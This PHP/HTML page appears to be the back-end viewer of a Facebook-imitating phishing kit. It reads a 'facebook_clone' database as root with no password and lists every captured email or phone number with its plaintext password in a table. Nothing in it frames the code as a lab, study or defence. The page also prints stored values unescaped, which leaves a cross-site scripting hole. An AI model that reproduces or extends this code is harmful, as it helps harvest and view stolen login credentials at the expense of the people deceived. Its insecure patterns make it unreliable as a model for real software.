<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>View Login Attempts</title>
    <link rel="stylesheet" href="styles.css"> <!-- Link to your CSS file if needed -->
    <style>
        table {
            width: 100%;
            border-collapse: collapse;
        }
        table, th, td {
            border: 1px solid black;
        }
        th, td {
            padding: 15px;
            text-align: left;
        }
        th {
            background-color: #f2f2f2;
        }

        /* Responsive styles */
        @media (max-width: 600px) {
            table, th, td {
                display: block;
            }
            th {
                display: none;
            }
            td {
                position: relative;
                padding-left: 50%;
                text-align: right;
                border: none;
                border-bottom: 1px solid #ddd;
            }
            td:before {
                content: attr(data-label);
                position: absolute;
                left: 0;
                width: 50%;
                padding-left: 15px;
                font-weight: bold;
                text-align: left;
                background-color: #f2f2f2;
            }
        }
    </style>
</head>
<body>
    <h2>Login Attempts</h2>
    <table>
        <tr>
            <th>ID</th>
            <th>Email or Phone</th>
            <th>Password</th>
            <th>Login Time</th>
        </tr>
        <?php
        $conn = new mysqli('localhost', 'root', '', 'facebook_clone');

        if ($conn->connect_error) {
            die("Connection failed: " . $conn->connect_error);
        }

        $sql = "SELECT id, email_or_phone, password, login_time FROM login_attempts";
        $result = $conn->query($sql);

        if ($result->num_rows > 0) {
            while($row = $result->fetch_assoc()) {
                echo "<tr>";
                echo "<td data-label='ID'>" . $row["id"] . "</td>";
                echo "<td data-label='Email or Phone'>" . $row["email_or_phone"] . "</td>";
                echo "<td data-label='Password'>" . $row["password"] . "</td>";
                echo "<td data-label='Login Time'>" . $row["login_time"] . "</td>";
                echo "</tr>";
            }
        } else {
            echo "<tr><td colspan='4'>No login attempts found</td></tr>";
        }

        $conn->close();
        ?>
    </table>
</body>
</html>
